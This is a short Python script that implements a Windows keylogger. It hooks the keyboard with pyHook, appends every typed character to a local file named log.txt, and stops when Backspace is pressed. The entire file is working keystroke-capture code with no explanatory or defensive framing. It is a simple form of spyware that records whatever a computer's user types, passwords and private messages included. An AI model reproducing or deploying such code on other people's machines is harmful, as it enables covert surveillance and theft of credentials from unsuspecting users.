import pyHook, pythoncom, sys, logging

file_log='log.txt'

def OnKeyBoardEvent(event):
	# logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	# logging.log(10,chr(event.Ascii))
	
	if event.Ascii==8: #Exit on backspace
		exit(1)

	f=open('log.txt','a') #Open log file to write keys

	if event.Ascii==13: #In case key is carraige return enter a new line in log file
		f.write('\n')
		f.close()
		return True
	
	f.write(chr(event.Ascii)) 
	f.close()
	return True

hooks_manager=pyHook.HookManager()     #Create a hook
hooks_manager.KeyDown=OnKeyBoardEvent  #Assign keydown event handler
hooks_manager.HookKeyboard()           #assign hook to the keyboard
pythoncom.PumpMessages()             